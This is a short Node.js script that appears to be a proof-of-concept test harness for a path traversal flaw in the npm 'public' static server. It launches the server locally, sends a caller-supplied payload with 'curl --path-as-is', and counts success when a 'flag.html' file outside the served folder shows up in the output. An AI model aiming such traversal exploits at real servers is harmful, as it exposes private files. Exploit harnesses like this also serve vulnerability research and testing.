const { exec } = require("child_process");
const path = require("path"); // Ensure path module is imported

function exploitFunction(payload) {
  let server = "node ./node_modules/public/bin/public";
  exec(server, (error, stdout) => {
    if (error) {
      console.error(`Error: ${error}`);
      return;
    }
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:3000${payload}"`;
    exec(attack_string, (error, stdout) => {
      let out = false;
      if (stdout.includes(path.resolve(__dirname, "../flag.html"))) {
        out = true;
      }
      console.log(stdout);
      return out;
    });
  });
}

module.exports = { exploitFunction };